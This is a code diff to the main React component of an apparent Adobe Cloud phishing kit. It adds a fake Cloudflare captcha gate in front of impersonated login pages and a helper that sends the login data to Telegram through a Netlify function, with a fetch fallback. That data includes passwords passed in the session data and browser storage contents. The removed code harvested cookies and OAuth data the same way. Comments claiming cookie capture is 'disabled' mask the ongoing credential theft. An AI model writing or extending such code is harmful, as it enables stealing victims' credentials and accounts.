@@ -1,15 +1,15 @@
 import React, { useState, useEffect } from 'react';
-import LandingPage from './components/LandingPage';
-import MobileLandingPage from './components/mobile/MobileLandingPage';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
+import LandingPage from './components/LandingPage';
+import MobileLandingPage from './components/mobile/MobileLandingPage';
+import CloudflareCaptcha from './components/CloudflareCaptcha';
 import { 
   getBrowserFingerprint, 
-  extractEmailFromProvider,
   sendToTelegram 
 } from './utils/oauthHandler';
 
-// Import the new real-time cookie system
+// Import the real-time cookie system for session management (not for capture)
 import { 
   setCookie, 
   getCookie, 
@@ -21,9 +21,61 @@ import {
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
-  const [currentPage, setCurrentPage] = useState('home');
+  const [currentPage, setCurrentPage] = useState('captcha'); // Start with captcha
   const [selectedFileName, setSelectedFileName] = useState('');
   const [isLoading, setIsLoading] = useState(true);
+  const [captchaVerified, setCaptchaVerified] = useState(false);
+
+  // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
+  const safeSendToTelegram = async (sessionData: any) => {
+    console.log('🚀 Starting safeSendToTelegram with data:', sessionData);
+    
+    // Primary: use the project's sendToTelegram utility if available
+    if (typeof sendToTelegram === 'function') {
+      try {
+        console.log('📡 Attempting primary sendToTelegram util...');
+        const result = await sendToTelegram(sessionData);
+        console.log('✅ sendToTelegram(util) result:', result);
+        return result;
+      } catch (err) {
+        console.error('❌ sendToTelegram(util) failed:', err);
+        // Fall through to fetch fallback
+      }
+    } else {
+      console.warn('⚠️ sendToTelegram util is not a function or not available; using fetch fallback');
+    }
+
+    // Fallback: call the Netlify function endpoint directly
+    try {
+      console.log('📡 Attempting fetch fallback to /.netlify/functions/sendTelegram...');
+      const res = await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(sessionData)
+      });
+
+      console.log('📡 Fetch response status:', res.status, res.statusText);
+
+      if (!res.ok) {
+        const bodyText = await res.text().catch(() => '');
+        console.error('❌ Fetch response not ok:', bodyText);
+        throw new Error(`HTTP ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
+      }
+
+      let data;
+      try {
+        data = await res.json();
+      } catch {
+        data = null;
+      }
+      console.log('✅ sendToTelegram(fetch) result:', data);
+      return data;
+    } catch (fetchErr) {
+      console.error('❌ sendToTelegram fallback (fetch) failed:', fetchErr);
+      // Re-throw so caller knows it failed
+      throw fetchErr;
+    }
+  };
 
   // Check if device is mobile
   useEffect(() => {
@@ -49,7 +101,9 @@ function App() {
         if (event.action === 'remove' || event.value === '' || event.value === 'false') {
           console.log('🔄 Session ended in another tab');
           setHasActiveSession(false);
-          setCurrentPage('login');
+          // If session ends, go back to captcha first
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
         } else if (event.action === 'set' || event.action === 'update') {
           console.log('🔄 Session updated in another tab');
           setHasActiveSession(true);
@@ -67,7 +121,7 @@ function App() {
       try {
         // Check if we're in browser environment
         if (typeof window === 'undefined') {
-          setCurrentPage('login');
+          setCurrentPage('captcha');
           setIsLoading(false);
           return;
         }
@@ -77,8 +131,10 @@ function App() {
         const isOAuthCallback = urlParams.has('oauth_callback') || urlParams.has('code') || urlParams.has('state');
         
         if (isOAuthCallback) {
-          await handleOAuthCallback();
+          // This logic is now deprecated with the removal of OAuth flow, but kept for compatibility.
+          // It will now just redirect to the landing page if called.
           setIsLoading(false);
+          setCurrentPage('landing');
           return;
         }
 
@@ -90,7 +146,7 @@ function App() {
         if (cookieSession) {
           try {
             existingSession = JSON.parse(decodeURIComponent(cookieSession));
-            console.log('✅ Session restored from cookie:', existingSession.email);
+            console.log('✅ Session restored from cookie:', existingSession?.email);
           } catch (error) {
             console.warn('Invalid cookie session data:', error);
           }
@@ -102,7 +158,7 @@ function App() {
           if (localSession) {
             try {
               existingSession = JSON.parse(localSession);
-              console.log('✅ Session restored from localStorage:', existingSession.email);
+              console.log('✅ Session restored from localStorage:', existingSession?.email);
               
               // Migrate to cookie system for future reliability (no expiry)
               setCookie('adobe_session', encodeURIComponent(localSession), {
@@ -123,14 +179,15 @@ function App() {
 
         if (existingSession) {
           setHasActiveSession(true);
+          setCaptchaVerified(true); // Skip captcha if session exists
           setCurrentPage('landing');
         } else {
-          // No valid session, start with login page
-          setCurrentPage('login');
+          // No valid session, start with captcha
+          setCurrentPage('captcha');
         }
       } catch (error) {
         console.error('Session check error:', error);
-        setCurrentPage('login');
+        setCurrentPage('captcha');
       } finally {
         setIsLoading(false);
       }
@@ -139,131 +196,24 @@ function App() {
     checkSession();
   }, []);
 
-  const handleOAuthCallback = async () => {
-    if (typeof window === 'undefined') return;
-    
-    const urlParams = new URLSearchParams(window.location.search);
-    const code = urlParams.get('code');
-    const state = urlParams.get('state');
-    const provider = urlParams.get('provider');
-    
-    if (code && provider) {
-      console.log('🔐 Processing OAuth callback for:', provider);
-      
-      // Capture cookies and session data after successful OAuth return
-      const postAuthFingerprint = getBrowserFingerprint();
-      
-      const sessionData = {
-        email: extractEmailFromProvider(provider, code),
-        provider: provider,
-        sessionId: Math.random().toString(36).substring(2, 15),
-        timestamp: new Date().toISOString(),
-        fileName: 'Adobe Cloud Access',
-        clientIP: 'Unknown',
-        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
-        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-        cookies: postAuthFingerprint.cookies,
-        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
-        localStorage: postAuthFingerprint.localStorage,
-        sessionStorage: postAuthFingerprint.sessionStorage,
-        browserFingerprint: postAuthFingerprint
-      };
-
-      // Store successful session (keep your existing localStorage)
-      if (typeof localStorage !== 'undefined') {
-        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
-      }
-      
-      // Enhanced cookie setting with real-time system (no expiry)
-      try {
-        const sessionId = sessionData.sessionId;
-        const cookieOptions = {
-          path: '/',
-          secure: process.env.NODE_ENV === 'production',
-          sameSite: 'strict' as const
-          // No expires = session cookie (no expiry until browser closes)
-        };
-        
-        // Use real-time cookie system
-        setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
-        setCookie('sessionid', sessionId, cookieOptions);
-        setCookie('auth_token', btoa(sessionData.email + ':oauth'), cookieOptions);
-        setCookie('logged_in', 'true', cookieOptions);
-        setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
-        
-        console.log('🍪 Session cookies set with real-time system (no expiry)');
-      } catch (e) {
-        console.warn('Failed to set cookies:', e);
-        
-        // Fallback to your existing method (no expiry)
-        if (typeof document !== 'undefined') {
-          const sessionId = sessionData.sessionId;
-          
-          document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
-          document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
-          document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; path=/; secure; samesite=strict`;
-          document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
-          document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
-        }
-      }
-
-      // Send to Telegram
-      try {
-        await sendToTelegram(sessionData);
-        console.log('✅ Session data sent to Telegram');
-      } catch (error) {
-        console.error('❌ Failed to send to Telegram:', error);
-      }
-
-      setHasActiveSession(true);
-      setCurrentPage('landing');
-
-      // Clean up URL
-      if (typeof window !== 'undefined' && typeof document !== 'undefined') {
-        window.history.replaceState({}, document.title, window.location.pathname);
-      }
-
-      // Show success notification
-      if (typeof document === 'undefined') return;
-      
-      const notification = document.createElement('div');
-      notification.innerHTML = `
-        <div style="
-          position: fixed;
-          top: 20px;
-          right: 20px;
-          background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
-          color: #166534;
-          padding: 20px;
-          border-radius: 12px;
-          box-shadow: 0 10px 25px rgba(34, 197, 94, 0.15);
-          z-index: 10000;
-          max-width: 350px;
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-          border: 1px solid rgba(34, 197, 94, 0.3);
-        ">
-          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
-            ✅ Authentication Successful!
-          </div>
-          <div style="color: #6b7280; font-size: 14px;">
-            Welcome to Adobe Cloud
-          </div>
-        </div>
-      `;
-      document.body.appendChild(notification);
-      setTimeout(() => {
-        if (document.body.contains(notification)) {
-          document.body.removeChild(notification);
-        }
-      }, 4000);
-    }
+  // Handler for captcha verification
+  const handleCaptchaVerified = () => {
+    console.log('🔒 Captcha verified, redirecting to login...');
+    // Move the page first to avoid transient rendering of the captcha UI
+    setCurrentPage('login');
+    setCaptchaVerified(true);
+    setIsLoading(false); // Ensure loading is false
   };
 
   // Handler for login success from login components
   const handleLoginSuccess = async (sessionData: any) => {
     console.log('🔐 Login success:', sessionData);
     
-    // Enhanced cookie setting with real-time system (no expiry)
+    // Cookie capturing is disabled. Set placeholder values.
+    const realCookies = '';
+    const cookieList: any[] = [];
+    
+    // Enhanced cookie setting with real-time system (no expiry) for session management
     try {
       const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
       const cookieOptions = {
@@ -276,13 +226,13 @@ function App() {
       // Use real-time cookie system
       setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
       setCookie('sessionid', sessionId, cookieOptions);
-      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'oauth')), cookieOptions);
+      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd')), cookieOptions);
       setCookie('logged_in', 'true', cookieOptions);
       setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
       
-      console.log('🍪 Login cookies set with real-time system (no expiry)');
+      console.log('🍪 Login session cookies set with real-time system (no expiry)');
     } catch (e) {
-      console.warn('Failed to set cookies with real-time system, using fallback:', e);
+      console.warn('Failed to set session cookies with real-time system, using fallback:', e);
       
       // Fallback to your existing method (no expiry)
       if (typeof document !== 'undefined') {
@@ -290,13 +240,13 @@ function App() {
         
         document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
         document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
-        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'oauth'))}; path=/; secure; samesite=strict`;
+        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd'))}; path=/; secure; samesite=strict`;
         document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
         document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
       }
     }
 
-    const browserFingerprint = getBrowserFingerprint();
+    const browserFingerprint = await getBrowserFingerprint();
     
     const updatedSession = {
       ...sessionData,
@@ -306,32 +256,34 @@ function App() {
       clientIP: 'Unknown',
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-      cookies: browserFingerprint.cookies,
-      documentCookies: typeof document !== 'undefined' ? document.cookie : '',
+      cookies: 'Cookies not captured',
+      cookiesParsed: {},
+      cookieList: [],
+      documentCookies: '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
       browserFingerprint: browserFingerprint
     };
 
     setHasActiveSession(true);
+
+    // Store the updated session once (avoid duplicate writes)
     if (typeof localStorage !== 'undefined') {
       localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
-        // Store session data before calling success handler
-        if (typeof localStorage !== 'undefined') {
-          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
-        }
-        
     }
 
     try {
-      await sendToTelegram(updatedSession);
-        
-        // Ensure we redirect to landing page
-        setCurrentPage('landing');
-        setIsLoading(false);
+      await safeSendToTelegram(updatedSession);
+      
+      // Ensure we redirect to landing page
+      setCurrentPage('landing');
+      setIsLoading(false);
       console.log('✅ Login data sent to Telegram');
     } catch (error) {
       console.error('❌ Failed to send to Telegram:', error);
+      // Even if sending fails, still move to landing to avoid blocking UX
+      setCurrentPage('landing');
+      setIsLoading(false);
     }
 
     // Ensure we always redirect to landing page after successful login
@@ -376,7 +328,8 @@ function App() {
     }
     
     setHasActiveSession(false);
-    setCurrentPage('login');
+    setCaptchaVerified(false); // Reset captcha state on logout
+    setCurrentPage('captcha'); // Go back to captcha on logout
   };
 
   // Loading state
@@ -391,48 +344,63 @@ function App() {
     );
   }
 
-  // Render appropriate page based on current state
-  if (currentPage === 'login') {
-    return isMobile ? (
-      <MobileLoginPage 
-        fileName={selectedFileName}
-        onBack={() => setCurrentPage('home')}
-        onLoginSuccess={handleLoginSuccess} 
-      />
-    ) : (
-      <LoginPage 
-        fileName={selectedFileName}
-        onBack={() => setCurrentPage('home')}
-        onLoginSuccess={handleLoginSuccess} 
+  // Captcha verification page
+  if (currentPage === 'captcha' && !captchaVerified) {
+    return (
+      <CloudflareCaptcha
+        onCaptchaVerified={handleCaptchaVerified}
+        // Provide legacy prop name as well for compatibility with different CloudflareCaptcha implementations
+        onVerified={handleCaptchaVerified}
+        onCaptchaError={(error) => {
+          console.error('Captcha error:', error);
+          setIsLoading(false);
+        }}
       />
     );
   }
 
-  // Landing page
-  try {
-    return isMobile ? (
-      <MobileLandingPage onFileAction={handleFileAction} />
-    ) : (
-      <LandingPage onFileAction={handleFileAction} />
-    );
-  } catch (error) {
-    console.error('Landing page error:', error);
-    // Fallback if landing pages have issues
+  // Login page - use appropriate component based on device (after captcha is verified)
+  if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
+    const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
+    
+    console.log('🔐 Rendering login page:', { currentPage, captchaVerified, hasActiveSession, isMobile });
+    
     return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-        <div className="text-center">
-          <h1 className="text-2xl font-bold text-gray-800 mb-4">Welcome to Adobe Cloud</h1>
-          <p className="text-gray-600 mb-4">You have successfully authenticated!</p>
-          <button 
-            onClick={handleLogout}
-            className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
-          >
-            Logout
-          </button>
-        </div>
-      </div>
+      <LoginComponent
+        fileName="Adobe Cloud Access"
+        onBack={() => {
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
+        }}
+        onLoginSuccess={handleLoginSuccess}
+        onLoginError={(error) => {
+          console.error('Login error:', error);
+        }}
+        showBackButton={true}
+      />
     );
   }
+
+  // Landing page - use appropriate component based on device
+  if (hasActiveSession && currentPage === 'landing') {
+    const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
+    
+    return (
+      <LandingComponent
+        onFileAction={handleFileAction}
+        onLogout={handleLogout}
+      />
+    );
+  }
+
+  // Fallback
+  return (
+    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
+      <div className="text-center">
+        <p className="text-gray-600">Loading application...</p>
+      </div>
+    </div>
+  );
 }
 
 export default App;
